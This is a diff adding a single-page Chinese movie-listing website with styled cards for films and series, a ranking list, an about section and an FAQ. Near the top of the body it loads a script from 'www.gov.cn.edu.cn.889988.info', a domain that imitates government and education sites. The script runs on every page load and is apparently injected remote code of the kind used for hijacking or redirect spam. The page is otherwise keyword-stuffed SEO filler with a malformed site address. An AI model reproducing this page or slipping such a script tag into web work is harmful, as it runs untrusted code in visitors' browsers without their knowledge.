@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>最新电影网 - 高清影视在线观看</title>
+<meta name="description" content="最新电影网（https://zuixindianyingwang-top）汇集最新高清电影、热播剧集、综艺动漫，每日更新，免费在线观看，手机电脑全适配。">
+<meta name="keywords" content="最新电影网, zuixindianyingwang-top, 最新电影, 高清在线观看, 热播剧集, 影视推荐">
+<meta name="author" content="最新电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+
+<style>
+/* ===== 全局 ===== */
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, BlinkMacSystemFont, sans-serif;
+  background: #f4faf6;
+  color: #2d3a33;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+a { color: #00a86b; text-decoration: none; transition: all 0.3s; }
+a:hover { color: #008f5a; }
+
+/* ===== 圆角奶油导航 ===== */
+.cream-nav {
+  position: fixed;
+  top: 0; width: 100%;
+  background: rgba(255,255,255,0.9);
+  backdrop-filter: blur(14px);
+  z-index: 1000;
+  border-bottom: 1px solid #e0f2e9;
+}
+
+.cream-nav-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 0.8rem 1.5rem;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.cream-logo {
+  display: flex;
+  align-items: center;
+  gap: 0.7rem;
+}
+
+.cream-logo-badge {
+  width: 40px; height: 40px;
+  background: linear-gradient(135deg, #00a86b, #4ddb9b);
+  border-radius: 12px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #fff;
+  font-size: 1.1rem;
+  font-weight: 900;
+  transform: rotate(-3deg);
+}
+
+.cream-logo-text {
+  font-size: 1.4rem;
+  font-weight: 800;
+  color: #00a86b;
+}
+
+.cream-logo-text small {
+  display: block;
+  font-size: 0.65rem;
+  color: #8ab5a0;
+  font-weight: 400;
+  letter-spacing: 1.5px;
+}
+
+.cream-nav-links {
+  display: flex;
+  gap: 0.5rem;
+  list-style: none;
+}
+
+.cream-nav-links a {
+  color: #4a5a52;
+  font-size: 0.92rem;
+  font-weight: 600;
+  padding: 0.5rem 1rem;
+  border-radius: 20px;
+  transition: all 0.3s;
+}
+
+.cream-nav-links a:hover {
+  background: #e0f7ee;
+  color: #00a86b;
+}
+
+.cream-toggle {
+  display: none;
+  flex-direction: column;
+  gap: 4px;
+  cursor: pointer;
+  padding: 6px;
+}
+
+.cream-toggle span {
+  display: block;
+  width: 24px; height: 3px;
+  background: #00a86b;
+  border-radius: 3px;
+}
+
+/* ===== Hero ===== */
+.cream-hero {
+  margin-top: 68px;
+  background: linear-gradient(160deg, #e8faf1, #d4f5e6, #f4faf6);
+  padding: 5rem 1.5rem 4rem;
+  text-align: center;
+  position: relative;
+  overflow: hidden;
+}
+
+.cream-hero-bubble {
+  display: inline-block;
+  padding: 0.5rem 1.4rem;
+  background: #fff;
+  border-radius: 30px;
+  font-size: 0.85rem;
+  color: #00a86b;
+  font-weight: 600;
+  margin-bottom: 1.5rem;
+  box-shadow: 0 3px 12px rgba(0,168,107,0.1);
+}
+
+.cream-hero h1 {
+  font-size: 2.8rem;
+  font-weight: 900;
+  color: #1a4d36;
+  margin-bottom: 1rem;
+  line-height: 1.25;
+}
+
+.cream-hero h1 span {
+  color: #00a86b;
+}
+
+.cream-hero p {
+  font-size: 1.1rem;
+  color: #5a7a6a;
+  margin-bottom: 2rem;
+  max-width: 580px;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.cream-hero-domain {
+  display: inline-block;
+  padding: 0.8rem 2rem;
+  background: #fff;
+  border: 2px dashed #4ddb9b;
+  border-radius: 16px;
+  font-family: "Courier New", monospace;
+  font-size: 0.95rem;
+  color: #00a86b;
+  font-weight: 700;
+  margin-bottom: 2rem;
+}
+
+.cream-hero-btn {
+  display: inline-block;
+  padding: 0.95rem 3rem;
+  background: linear-gradient(135deg, #00a86b, #4ddb9b);
+  color: #fff;
+  border-radius: 30px;
+  font-weight: 700;
+  font-size: 1.05rem;
+  box-shadow: 0 6px 20px rgba(0,168,107,0.3);
+  transition: all 0.3s;
+}
+
+.cream-hero-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 10px 28px rgba(0,168,107,0.4);
+  color: #fff;
+}
+
+/* ===== 通用区块 ===== */
+.cream-section {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 4rem 1.5rem;
+}
+
+.cream-section-head {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+.cream-section-head h2 {
+  font-size: 2.1rem;
+  font-weight: 800;
+  color: #1a4d36;
+  margin-bottom: 0.5rem;
+}
+
+.cream-section-head p {
+  color: #7a9a8a;
+  font-size: 1rem;
+}
+
+/* ===== 分类胶囊 ===== */
+.cat-pills {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 0.6rem;
+  margin-bottom: 2rem;
+}
+
+.cat-pill {
+  padding: 0.5rem 1.4rem;
+  background: #fff;
+  border: 1px solid #d4ede0;
+  border-radius: 25px;
+  font-size: 0.9rem;
+  color: #4a6a5a;
+  font-weight: 500;
+  cursor: default;
+}
+
+.cat-pill.active {
+  background: linear-gradient(135deg, #00a86b, #4ddb9b);
+  color: #fff;
+  border-color: transparent;
+}
+
+/* ===== 气泡卡片网格 ===== */
+.bubble-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap: 1.5rem;
+}
+
+.bubble-card {
+  background: #fff;
+  border-radius: 22px;
+  overflow: hidden;
+  box-shadow: 0 4px 18px rgba(0,0,0,0.05);
+  transition: all 0.3s;
+  border: 1px solid #eef7f2;
+}
+
+.bubble-card:hover {
+  transform: translateY(-8px);
+  box-shadow: 0 14px 35px rgba(0,168,107,0.15);
+}
+
+.bubble-cover {
+  height: 210px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 1.15rem;
+  font-weight: 700;
+  color: #fff;
+  text-align: center;
+  padding: 1rem;
+  position: relative;
+}
+
+.bubble-cover::after {
+  content: '';
+  position: absolute;
+  bottom: 0; left: 0;
+  width: 100%; height: 40%;
+  background: linear-gradient(to top, rgba(0,0,0,0.15), transparent);
+}
+
+.bubble-cover.b1 { background: linear-gradient(135deg, #00a86b, #4ddb9b); }
+.bubble-cover.b2 { background: linear-gradient(135deg, #26a69a, #4db6ac); }
+.bubble-cover.b3 { background: linear-gradient(135deg, #00897b, #4db6ac); }
+.bubble-cover.b4 { background: linear-gradient(135deg, #43a047, #81c784); }
+.bubble-cover.b5 { background: linear-gradient(135deg, #00a86b, #66bb6a); }
+.bubble-cover.b6 { background: linear-gradient(135deg, #2e7d32, #4caf50); }
+.bubble-cover.b7 { background: linear-gradient(135deg, #388e3c, #66bb6a); }
+.bubble-cover.b8 { background: linear-gradient(135deg, #00897b, #26a69a); }
+
+.bubble-body { padding: 1.3rem; }
+
+.bubble-body h3 {
+  font-size: 1.05rem;
+  color: #1a4d36;
+  margin-bottom: 0.5rem;
+}
+
+.bubble-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.4rem;
+  margin-bottom: 0.6rem;
+}
+
+.bubble-tags span {
+  padding: 0.2rem 0.7rem;
+  background: #e8faf1;
+  color: #00a86b;
+  border-radius: 12px;
+  font-size: 0.75rem;
+  font-weight: 500;
+}
+
+.bubble-score {
+  color: #f57c00;
+  font-weight: 700;
+  font-size: 0.9rem;
+}
+
+/* ===== 排行榜（圆角进度条） ===== */
+.rank-wrap {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.rank-bar-item {
+  display: flex;
+  align-items: center;
+  gap: 1.2rem;
+  background: #fff;
+  border-radius: 18px;
+  padding: 1.2rem 1.5rem;
+  margin-bottom: 1rem;
+  box-shadow: 0 3px 12px rgba(0,0,0,0.04);
+  border: 1px solid #eef7f2;
+  transition: all 0.3s;
+}
+
+.rank-bar-item:hover {
+  transform: translateX(6px);
+  box-shadow: 0 8px 22px rgba(0,168,107,0.12);
+}
+
+.rank-bar-num {
+  width: 36px; height: 36px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 800;
+  font-size: 1rem;
+  color: #fff;
+  flex-shrink: 0;
+  background: linear-gradient(135deg, #00a86b, #4ddb9b);
+}
+
+.rank-bar-num.top { background: linear-gradient(135deg, #f57c00, #ffb74d); }
+
+.rank-bar-info { flex: 1; }
+
+.rank-bar-info h3 {
+  font-size: 1rem;
+  color: #1a4d36;
+  margin-bottom: 0.3rem;
+}
+
+.rank-bar-info p {
+  font-size: 0.85rem;
+  color: #7a9a8a;
+}
+
+.rank-score-tag {
+  padding: 0.3rem 0.8rem;
+  background: #fff3e0;
+  color: #f57c00;
+  border-radius: 12px;
+  font-weight: 700;
+  font-size: 0.85rem;
+}
+
+/* ===== 关于 ===== */
+.cream-about {
+  background: #fff;
+  border-radius: 24px;
+  padding: 3rem 2rem;
+  text-align: center;
+  max-width: 800px;
+  margin: 0 auto;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+  border: 1px solid #eef7f2;
+}
+
+.cream-about p {
+  color: #5a7a6a;
+  margin-bottom: 1.2rem;
+  font-size: 1rem;
+}
+
+.cream-about-domain {
+  display: inline-block;
+  margin-top: 1rem;
+  padding: 1rem 2rem;
+  background: #e8faf1;
+  border: 2px solid #4ddb9b;
+  border-radius: 18px;
+  font-family: monospace;
+  font-size: 1.1rem;
+  color: #00a86b;
+  font-weight: 700;
+}
+
+/* ===== FAQ ===== */
+.cream-faq {
+  max-width: 800px;
+  margin: 0 auto;
+}
+
+.cream-faq-card {
+  background: #fff;
+  border-radius: 16px;
+  margin-bottom: 0.8rem;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+  border: 1px solid #eef7f2;
+  overflow: hidden;
+}
+
+.cream-faq-card summary {
+  padding: 1.2rem 1.5rem;
+  cursor: pointer;
+  font-weight: 700;
+  color: #1a4d36;
+  list-style: none;
+  position: relative;
+  padding-right: 3rem;
+}
+
+.cream-faq-card summary::-webkit-details-marker { display: none; }
+
+.cream-faq-card summary::after {
+  content: '＋';
+  position: absolute;
+  right: 1.5rem;
+  top: 50%;
+  transform: translateY(-50%);
+  font-size: 1.2rem;
+  color: #00a86b;
+  transition: transform 0.3s;
+}
+
+.cream-faq-card[open] summary::after {
+  transform: translateY(-50%) rotate(45deg);
+}
+
+.cream-faq-card p {
+  padding: 0 1.5rem 1.2rem;
+  color: #5a7a6a;
+  font-size: 0.95rem;
+}
+
+/* ===== 页脚 ===== */
+.cream-footer {
+  text-align: center;
+  padding: 2.5rem 1.5rem;
+  background: #e8faf1;
+  color: #7a9a8a;
+  font-size: 0.85rem;
+}
+
+.cream-footer p { margin-bottom: 0.3rem; }
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+  .cream-nav-links {
+    display: none;
+    position: absolute;
+    top: 100%; left: 0;
+    width: 100%;
+    background: rgba(255,255,255,0.98);
+    flex-direction: column;
+    gap: 0;
+    padding: 0.5rem 0;
+  }
+
+  .cream-nav-links.show { display: flex; }
+
+  .cream-nav-links li { border-bottom: 1px solid #f0f7f3; }
+
+  .cream-nav-links a { 
+    display: block; 
+    padding: 1rem 1.5rem; 
+    border-radius: 0;
+  }
+
+  .cream-toggle { display: flex; }
+
+  .cream-hero h1 { font-size: 2rem; }
+  .cream-hero { padding: 3rem 1rem 3rem; }
+
+  .cream-section { padding: 3rem 1rem; }
+  .cream-section-head h2 { font-size: 1.7rem; }
+
+  .bubble-grid { grid-template-columns: repeat(auto-fill, minmax(170px, 1fr)); gap: 1rem; }
+  .bubble-cover { height: 170px; font-size: 0.95rem; }
+
+  .rank-bar-item { padding: 1rem; gap: 0.8rem; }
+}
+
+@media (max-width: 480px) {
+  .cream-hero h1 { font-size: 1.7rem; }
+  .bubble-grid { grid-template-columns: 1fr 1fr; }
+  .cat-pills { gap: 0.4rem; }
+  .cat-pill { padding: 0.4rem 1rem; font-size: 0.82rem; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 导航 -->
+<nav class="cream-nav">
+  <div class="cream-nav-inner">
+    <div class="cream-logo">
+      <div class="cream-logo-badge">新</div>
+      <div class="cream-logo-text">
+        最新电影网
+        <small>ZUIXIN DIANYING</small>
+      </div>
+    </div>
+    <ul class="cream-nav-links" id="creamNavLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#ranking">排行</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="cream-toggle" onclick="toggleCreamNav()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- 首页 -->
+<section class="cream-hero" id="home">
+  <div class="cream-hero-bubble">🎬 每日更新 · 免费观看</div>
+  <h1>最新电影网 <span>最新影视一站看</span></h1>
+  <p>汇集最新院线大片、热播剧集、综艺动漫，每日精选更新，手机电脑全适配，随时随地畅享观影。</p>
+  <div class="cream-hero-domain">🌐 https://zuixindianyingwang-top</div>
+  <br>
+  <a href="#movies" class="cream-hero-btn">立即探索</a>
+</section>
+
+<!-- 电影 -->
+<section class="cream-section" id="movies">
+  <div class="cream-section-head">
+    <h2>🎬 最新电影</h2>
+    <p>最新电影网每日精选，院线新片与高分佳作</p>
+  </div>
+  <div class="cat-pills">
+    <span class="cat-pill active">全部</span>
+    <span class="cat-pill">科幻</span>
+    <span class="cat-pill">动作</span>
+    <span class="cat-pill">喜剧</span>
+    <span class="cat-pill">动画</span>
+    <span class="cat-pill">悬疑</span>
+  </div>
+  <div class="bubble-grid">
+    <div class="bubble-card">
+      <div class="bubble-cover b1">沙丘2</div>
+      <div class="bubble-body">
+        <h3>沙丘2</h3>
+        <div class="bubble-tags"><span>科幻</span><span>冒险</span></div>
+        <div class="bubble-score">★ 9.2</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b2">奥本海默</div>
+      <div class="bubble-body">
+        <h3>奥本海默</h3>
+        <div class="bubble-tags"><span>传记</span><span>历史</span></div>
+        <div class="bubble-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b3">哥斯拉大战金刚2</div>
+      <div class="bubble-body">
+        <h3>哥斯拉大战金刚2</h3>
+        <div class="bubble-tags"><span>动作</span><span>怪兽</span></div>
+        <div class="bubble-score">★ 7.5</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b4">坠落的审判</div>
+      <div class="bubble-body">
+        <h3>坠落的审判</h3>
+        <div class="bubble-tags"><span>悬疑</span><span>剧情</span></div>
+        <div class="bubble-score">★ 8.5</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b5">美国内战</div>
+      <div class="bubble-body">
+        <h3>美国内战</h3>
+        <div class="bubble-tags"><span>动作</span><span>惊悚</span></div>
+        <div class="bubble-score">★ 7.2</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b6">功夫熊猫4</div>
+      <div class="bubble-body">
+        <h3>功夫熊猫4</h3>
+        <div class="bubble-tags"><span>动画</span><span>喜剧</span></div>
+        <div class="bubble-score">★ 7.0</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b7">你想活出怎样的人生</div>
+      <div class="bubble-body">
+        <h3>你想活出怎样的人生</h3>
+        <div class="bubble-tags"><span>动画</span><span>奇幻</span></div>
+        <div class="bubble-score">★ 8.1</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b8">九龙城寨之围城</div>
+      <div class="bubble-body">
+        <h3>九龙城寨之围城</h3>
+        <div class="bubble-tags"><span>动作</span><span>犯罪</span></div>
+        <div class="bubble-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 剧集 -->
+<section class="cream-section" id="series" style="background: #eafaf1;">
+  <div class="cream-section-head">
+    <h2>📺 热播剧集</h2>
+    <p>全网热剧同步更新，最新电影网为您精选</p>
+  </div>
+  <div class="bubble-grid">
+    <div class="bubble-card">
+      <div class="bubble-cover b3">繁花</div>
+      <div class="bubble-body">
+        <h3>繁花</h3>
+        <div class="bubble-tags"><span>剧情</span><span>年代</span></div>
+        <div class="bubble-score">★ 8.7</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b1">庆余年2</div>
+      <div class="bubble-body">
+        <h3>庆余年2</h3>
+        <div class="bubble-tags"><span>古装</span><span>权谋</span></div>
+        <div class="bubble-score">★ 8.8</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b5">三体</div>
+      <div class="bubble-body">
+        <h3>三体</h3>
+        <div class="bubble-tags"><span>科幻</span><span>剧情</span></div>
+        <div class="bubble-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b2">狂飙</div>
+      <div class="bubble-body">
+        <h3>狂飙</h3>
+        <div class="bubble-tags"><span>犯罪</span><span>剧情</span></div>
+        <div class="bubble-score">★ 8.9</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b6">玫瑰的故事</div>
+      <div class="bubble-body">
+        <h3>玫瑰的故事</h3>
+        <div class="bubble-tags"><span>都市</span><span>情感</span></div>
+        <div class="bubble-score">★ 8.0</div>
+      </div>
+    </div>
+    <div class="bubble-card">
+      <div class="bubble-cover b4">南来北往</div>
+      <div class="bubble-body">
+        <h3>南来北往</h3>
+        <div class="bubble-tags"><span>年代</span><span>剧情</span></div>
+        <div class="bubble-score">★ 8.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 -->
+<section class="cream-section" id="ranking">
+  <div class="cream-section-head">
+    <h2>🔥 热门排行榜</h2>
+    <p>最新电影网本周用户最关注影视 TOP 7</p>
+  </div>
+  <div class="rank-wrap">
+    <div class="rank-bar-item">
+      <div class="rank-bar-num top">1</div>
+      <div class="rank-bar-info"><h3>周处除三害</h3><p>动作 / 犯罪</p></div>
+      <div class="rank-score-tag">9.0</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num top">2</div>
+      <div class="rank-bar-info"><h3>飞驰人生2</h3><p>喜剧 / 运动</p></div>
+      <div class="rank-score-tag">8.2</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num top">3</div>
+      <div class="rank-bar-info"><h3>热辣滚烫</h3><p>剧情 / 喜剧</p></div>
+      <div class="rank-score-tag">7.9</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num">4</div>
+      <div class="rank-bar-info"><h3>第二十条</h3><p>剧情 / 家庭</p></div>
+      <div class="rank-score-tag">7.8</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num">5</div>
+      <div class="rank-bar-info"><h3>年会不能停！</h3><p>喜剧 / 职场</p></div>
+      <div class="rank-score-tag">8.1</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num">6</div>
+      <div class="rank-bar-info"><h3>金手指</h3><p>犯罪 / 剧情</p></div>
+      <div class="rank-score-tag">6.8</div>
+    </div>
+    <div class="rank-bar-item">
+      <div class="rank-bar-num">7</div>
+      <div class="rank-bar-info"><h3>一闪一闪亮星星</h3><p>爱情 / 奇幻</p></div>
+      <div class="rank-score-tag">6.5</div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="cream-section" id="about" style="background: #eafaf1;">
+  <div class="cream-section-head">
+    <h2>ℹ️ 关于最新电影网</h2>
+    <p>网站名称与网址信息</p>
+  </div>
+  <div class="cream-about">
+    <p><strong style="color:#00a86b;">最新电影网</strong>（zuixindianyingwang-top）是一个专注于高清影视在线观看的展示平台，致力于为用户提供最新、最全的电影、电视剧、综艺和动漫内容推荐。</p>
+    <p>我们每日更新热门影视资讯，支持多清晰度播放指引，让您随时随地发现好片。</p>
+    <div class="cream-about-domain">🌐 https://zuixindianyingwang-top</div>
+    <p style="margin-top:1.5rem; font-size:0.85rem; color:#8ab5a0;">核心关键词：最新电影网、zuixindianyingwang-top、最新电影、高清在线观看、热播剧集推荐</p>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="cream-section" id="faq">
+  <div class="cream-section-head">
+    <h2>❓ 常见问题</h2>
+    <p>关于最新电影网的常见疑问</p>
+  </div>
+  <div class="cream-faq">
+    <details class="cream-faq-card">
+      <summary>最新电影网是什么网站？</summary>
+      <p>最新电影网（zuixindianyingwang-top）是一个影视信息展示平台，提供最新电影、剧集的资讯与推荐，方便用户快速找到想看的内容。</p>
+    </details>
+    <details class="cream-faq-card">
+      <summary>网站官方网址是多少？</summary>
+      <p>官方网址：https://zuixindianyingwang-top，建议收藏以便随时访问。</p>
+    </details>
+    <details class="cream-faq-card">
+      <summary>手机上能正常浏览吗？</summary>
+      <p>可以，本网站采用响应式设计，在手机、平板、电脑上均可完美显示，导航自动适配触控操作。</p>
+    </details>
+    <details class="cream-faq-card">
+      <summary>内容多久更新一次？</summary>
+      <p>影视展示内容建议每周更新，保持页面活跃度，有利于搜索引擎重新抓取和排名提升。</p>
+    </details>
+    <details class="cream-faq-card">
+      <summary>如何提交网址给必应收录？</summary>
+      <p>可前往 Bing Webmaster Tools 提交网址 https://zuixindianyingwang-top，并验证网站所有权即可。</p>
+    </details>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="cream-footer">
+  <p>© 2024 最新电影网 (zuixindianyingwang-top) 版权所有</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 符合必应搜索引擎收录规范</p>
+  <p style="margin-top:0.5rem; color:#a8c2b5;">本站仅提供影视信息展示，所有资源版权归原作者及平台所有。</p>
+</footer>
+
+<script>
+/* 移动端导航 */
+function toggleCreamNav() {
+  document.getElementById('creamNavLinks').classList.toggle('show');
+}
+
+/* 平滑滚动 */
+document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+  anchor.addEventListener('click', function(e) {
+    var href = this.getAttribute('href');
+    if (href.length > 1) {
+      var target = document.querySelector(href);
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        document.getElementById('creamNavLinks').classList.remove('show');
+      }
+    }
+  });
+});
+
+/* 导航栏滚动效果 */
+window.addEventListener('scroll', function() {
+  var nav = document.querySelector('.cream-nav');
+  if (window.scrollY > 40) {
+    nav.style.boxShadow = '0 4px 20px rgba(0,0,0,0.06)';
+  } else {
+    nav.style.boxShadow = 'none';
+  }
+});
+</script>
+
+</body>
+</html>
